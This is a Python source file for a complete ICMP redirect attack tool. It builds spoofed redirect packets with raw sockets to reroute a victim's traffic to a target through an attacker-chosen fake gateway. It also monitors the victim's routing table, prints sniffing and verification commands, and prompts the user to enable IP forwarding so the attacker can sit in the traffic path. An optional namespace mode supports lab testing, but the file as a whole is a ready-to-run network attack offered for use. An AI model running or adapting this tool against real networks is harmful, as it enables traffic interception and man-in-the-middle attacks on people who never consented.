#!/usr/bin/env python3
"""
Raw ICMP Redirect Attack Tool
=============================

ICMP redirect attack tool using raw sockets (no Scapy dependency).
Supports network namespace execution for isolated testing.
"""

import sys
import socket
import struct
import time
import threading
import argparse
import subprocess
import os
from faker import Faker
from colorama import init, Fore, Style

init(autoreset=True)

class RawICMPRedirect:
    """ICMP redirect attack using raw sockets"""
    
    def __init__(self, namespace=None):
        self.fake = Faker()
        self.namespace = namespace
        self.attack_stats = {
            'redirects_sent': 0,
            'routing_changes': 0,
            'packets_captured': 0
        }
        self.monitoring = False
        self.initial_routes = {}
    
    def show_banner(self):
        """Display attack banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("██████╗  █████╗ ██╗    ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗")
        print("██╔══██╗██╔══██╗██║    ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝")
        print("██████╔╝███████║██║ █╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   ")
        print("██╔══██╗██╔══██║██║███╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ")
        print("██║  ██║██║  ██║╚███╔███╔╝    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ")
        print("╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝     ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   ")
        print("                           RAW SOCKET ICMP REDIRECT ATTACK")
        if self.namespace:
            print(f"                              Namespace: {self.namespace}")
        print(f"{Style.RESET_ALL}")
    
    def get_namespace_interface(self):
        """Get the interface name within the namespace"""
        if not self.namespace:
            return None
        
        try:
            cmd = ['ip', 'netns', 'exec', self.namespace, 'ip', 'link', 'show']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'veth' in line and 'UP' in line and '@' in line:
                        # Extract interface name (e.g., "v-veth@if26" -> "v-veth")
                        interface = line.split(':')[1].strip().split('@')[0]
                        return interface
            return None
        except:
            return None
    
    def get_namespace_ip(self):
        """Get the IP address of the namespace interface"""
        if not self.namespace:
            return None
        
        try:
            cmd = ['ip', 'netns', 'exec', self.namespace, 'ip', 'addr', 'show']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'inet ' in line and '192.168.100' in line:
                        # Extract IP (e.g., "inet 192.168.100.2/24" -> "192.168.100.2")
                        ip = line.strip().split()[1].split('/')[0]
                        return ip
            return None
        except:
            return None
    
    def checksum(self, data):
        """Calculate Internet checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        
        return ~total & 0xFFFF
    
    def craft_ip_header(self, source_ip, dest_ip, payload_length):
        """Craft IP header"""
        version = 4
        header_length = 5
        tos = 0
        total_length = 20 + payload_length
        identification = 54321
        flags = 0
        fragment_offset = 0
        ttl = 64
        protocol = 1  # ICMP
        checksum = 0
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        
        header = struct.pack('!BBHHHBBH4s4s',
                           (version << 4) + header_length,
                           tos,
                           total_length,
                           identification,
                           (flags << 13) + fragment_offset,
                           ttl,
                           protocol,
                           checksum,
                           source,
                           dest)
        
        checksum = self.checksum(header)
        
        header = struct.pack('!BBHHHBBH4s4s',
                           (version << 4) + header_length,
                           tos,
                           total_length,
                           identification,
                           (flags << 13) + fragment_offset,
                           ttl,
                           protocol,
                           checksum,
                           source,
                           dest)
        
        return header
    
    def craft_icmp_redirect(self, gateway_ip, victim_ip, target_ip):
        """Craft ICMP redirect packet with embedded IP header"""
        # ICMP Type 5 (Redirect), Code 1 (Host redirect)
        icmp_type = 5
        icmp_code = 1
        checksum = 0
        gateway = socket.inet_aton(gateway_ip)
        
        # Create the original IP packet (victim -> target) that triggered the redirect
        inner_ip_header = self.craft_ip_header(victim_ip, target_ip, 8)  # IP + minimal ICMP
        inner_icmp = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Simple ICMP echo
        
        # ICMP redirect payload contains the original IP header + 8 bytes of data
        redirect_data = inner_ip_header + inner_icmp
        
        # ICMP redirect header
        icmp_header = struct.pack('!BBH4s',
                                icmp_type,
                                icmp_code,
                                checksum,
                                gateway)
        
        # Calculate checksum for ICMP header + data
        checksum = self.checksum(icmp_header + redirect_data)
        
        # Rebuild with correct checksum
        icmp_header = struct.pack('!BBH4s',
                                icmp_type,
                                icmp_code,
                                checksum,
                                gateway)
        
        return icmp_header + redirect_data
    
    def send_redirect_packet(self, gateway_ip, victim_ip, target_ip, fake_gateway_ip, interface=None):
        """Send ICMP redirect packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Bind to specific interface if in namespace
            if interface:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
                except:
                    pass  # Continue without binding if it fails
            
            # Craft ICMP redirect packet
            icmp_packet = self.craft_icmp_redirect(fake_gateway_ip, victim_ip, target_ip)
            ip_header = self.craft_ip_header(gateway_ip, victim_ip, len(icmp_packet))
            
            packet = ip_header + icmp_packet
            
            sock.sendto(packet, (victim_ip, 0))
            sock.close()
            
            self.attack_stats['redirects_sent'] += 1
            return True
            
        except PermissionError:
            print(f"{Fore.RED}Error: Root privileges required for raw sockets")
            return False
        except Exception as e:
            print(f"{Fore.RED}Error sending redirect: {e}")
            return False
    
    def capture_initial_route(self, target_ip, monitor_namespace=None):
        """Capture initial route to target"""
        try:
            if monitor_namespace:
                cmd = ['ip', 'netns', 'exec', monitor_namespace, 'ip', 'route', 'get', target_ip]
            else:
                cmd = ['ip', 'route', 'get', target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self.initial_routes[target_ip] = result.stdout.strip()
                print(f"Initial route to {target_ip}: {result.stdout.strip()}")
            else:
                print(f"{Fore.RED}Failed to get initial route")
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}Timeout getting initial route")
        except Exception as e:
            print(f"{Fore.RED}Error getting route: {e}")
    
    def monitor_routing_changes(self, victim_ip, target_ip, monitor_namespace=None):
        """Monitor for routing table changes"""
        while self.monitoring:
            try:
                if monitor_namespace:
                    cmd = ['ip', 'netns', 'exec', monitor_namespace, 'ip', 'route', 'get', target_ip]
                else:
                    cmd = ['ip', 'route', 'get', target_ip]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    current_route = result.stdout.strip()
                    if target_ip in self.initial_routes:
                        if current_route != self.initial_routes[target_ip]:
                            self.attack_stats['routing_changes'] += 1
                            print(f"\n{Fore.GREEN}Routing change detected!")
                            print(f"  Old: {self.initial_routes[target_ip]}")
                            print(f"  New: {current_route}")
                            self.initial_routes[target_ip] = current_route  # Update for next comparison
                
                time.sleep(2)
                
            except Exception as e:
                print(f"{Fore.RED}Error monitoring routes: {e}")
                time.sleep(5)
    
    def display_live_stats(self):
        """Display live attack statistics"""
        while self.monitoring:
            ns_info = f" [ns:{self.namespace}]" if self.namespace else ""
            print(f"\r{Fore.CYAN}LIVE{ns_info}: {self.attack_stats['redirects_sent']} redirects | "
                  f"{self.attack_stats['routing_changes']} route changes | "
                  f"{self.attack_stats['packets_captured']} packets", end='', flush=True)
            time.sleep(1)
    
    def perform_attack(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip, 
                      duration=60, continuous=False, monitor_namespace=None):
        """Perform ICMP redirect attack"""
        interface = self.get_namespace_interface() if self.namespace else None
        
        print(f"{Fore.RED}ICMP REDIRECT ATTACK")
        print(f"{Fore.YELLOW}Victim: {victim_ip}")
        print(f"Target: {target_ip}")
        print(f"Gateway: {gateway_ip}")
        print(f"Fake Gateway: {fake_gateway_ip}")
        if self.namespace:
            print(f"Attack Namespace: {self.namespace}")
            if interface:
                print(f"Attack Interface: {interface}")
        if monitor_namespace:
            print(f"Monitor Namespace: {monitor_namespace}")
        print(f"Duration: {duration}s")
        if continuous:
            print("Mode: CONTINUOUS")
        else:
            print("Mode: SINGLE")
        
        # Capture initial route
        self.capture_initial_route(target_ip, monitor_namespace)
        
        # Start monitoring
        self.monitoring = True
        
        # Start monitoring threads
        stats_thread = threading.Thread(target=self.display_live_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        route_monitor_thread = threading.Thread(target=self.monitor_routing_changes, 
                                               args=(victim_ip, target_ip, monitor_namespace))
        route_monitor_thread.daemon = True
        route_monitor_thread.start()
        
        print(f"{Fore.BLUE}Monitoring network traffic...")
        print(f"Monitoring routing changes on {victim_ip} for {target_ip}...")
        
        start_time = time.time()
        
        if continuous:
            # Send redirects continuously
            while time.time() - start_time < duration:
                print(f"\n{Fore.RED}Sending ICMP redirect...")
                print(f"  Claiming {fake_gateway_ip} is better route to {target_ip}")
                
                success = self.send_redirect_packet(gateway_ip, victim_ip, target_ip, fake_gateway_ip, interface)
                if success:
                    print(f"{Fore.GREEN}Redirect packet sent!")
                else:
                    print(f"{Fore.RED}Failed to send redirect")
                
                time.sleep(5)  # Wait 5 seconds between redirects
        else:
            # Send single redirect
            print(f"\n{Fore.RED}Sending ICMP redirect...")
            print(f"  Claiming {fake_gateway_ip} is better route to {target_ip}")
            
            success = self.send_redirect_packet(gateway_ip, victim_ip, target_ip, fake_gateway_ip, interface)
            if success:
                print(f"{Fore.GREEN}Redirect packet sent!")
            else:
                print(f"{Fore.RED}Failed to send redirect")
            
            print(f"{Fore.BLUE}Monitoring for {duration} seconds...")
            time.sleep(duration)
        
        self.monitoring = False
        self.show_final_stats()
        self.show_verification_steps(victim_ip, target_ip, fake_gateway_ip, monitor_namespace)
    
    def show_final_stats(self):
        """Display final attack statistics"""
        print(f"\n\n{Fore.CYAN}ATTACK SUMMARY")
        print("=" * 50)
        print(f"Redirects sent: {self.attack_stats['redirects_sent']}")
        print(f"Routing changes detected: {self.attack_stats['routing_changes']}")
        print(f"Packets captured: {self.attack_stats['packets_captured']}")
        if self.namespace:
            print(f"Attack namespace: {self.namespace}")
        print("=" * 50)
        
        if self.attack_stats['routing_changes'] > 0:
            print(f"{Fore.GREEN}SUCCESS: Routing table modified!")
        else:
            print(f"{Fore.RED}No routing changes detected")
    
    def show_verification_steps(self, victim_ip, target_ip, fake_gateway_ip, monitor_namespace=None):
        """Show manual verification commands"""
        print(f"\n{Fore.BLUE}VERIFICATION COMMANDS")
        print("=" * 50)
        
        if monitor_namespace:
            print(f"On victim namespace ({monitor_namespace}):")
            print(f"  sudo ip netns exec {monitor_namespace} ip route show | grep {target_ip}")
            print(f"  sudo ip netns exec {monitor_namespace} traceroute {target_ip}")
            print(f"  sudo ip netns exec {monitor_namespace} ping -c 3 {target_ip}")
            print(f"  sudo ip netns exec {monitor_namespace} watch -n 1 'ip route get {target_ip}'")
        else:
            print(f"On victim machine ({victim_ip}):")
            print(f"  ip route show | grep {target_ip}")
            print(f"  traceroute {target_ip}")
            print(f"  ping -c 3 {target_ip}")
        
        print(f"\nOn attacker machine:")
        print(f"  sudo tcpdump -i any host {victim_ip}")
        print(f"  sudo tcpdump -i any host {fake_gateway_ip}")
        
        if self.namespace:
            print(f"\nIn attack namespace ({self.namespace}):")
            print(f"  sudo ip netns exec {self.namespace} tcpdump -i any icmp")
        
        print("=" * 50)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Raw Socket ICMP Redirect Attack (Namespace-aware)')
    parser.add_argument('victim_ip', help='Victim IP address')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('gateway_ip', help='Current gateway IP')
    parser.add_argument('--fake-gateway', required=True, help='Fake gateway IP to redirect to')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--continuous', action='store_true', help='Send redirects continuously')
    parser.add_argument('--namespace', help='Network namespace to execute attack from')
    parser.add_argument('--monitor-namespace', help='Network namespace to monitor for routing changes')
    
    args = parser.parse_args()
    
    # If namespace is specified and we're not already in it, re-exec in namespace
    if args.namespace and not os.environ.get('IN_NETNS'):
        cmd = ['ip', 'netns', 'exec', args.namespace] + sys.argv
        env = os.environ.copy()
        env['IN_NETNS'] = '1'
        os.execvpe('ip', cmd, env)
    
    attacker = RawICMPRedirect(args.namespace)
    attacker.show_banner()
    
    print(f"{Fore.YELLOW}VICTIM: {args.victim_ip}")
    print(f"TARGET: {args.target_ip}")
    print(f"GATEWAY: {args.gateway_ip}")
    print(f"FAKE GATEWAY: {args.fake_gateway}")
    if args.continuous:
        print("MODE: CONTINUOUS")
    else:
        print("MODE: SINGLE")
    
    # Check if IP forwarding is enabled
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            forward_status = f.read().strip()
            if forward_status == '1':
                print(f"{Fore.GREEN}IP forwarding already enabled")
            else:
                print(f"{Fore.YELLOW}IP forwarding disabled - run: echo 1 > /proc/sys/net/ipv4/ip_forward")
    except:
        pass
    
    attacker.perform_attack(
        args.victim_ip,
        args.target_ip, 
        args.gateway_ip,
        args.fake_gateway,
        args.duration,
        args.continuous,
        args.monitor_namespace or args.namespace
    )

if __name__ == '__main__':
    main() 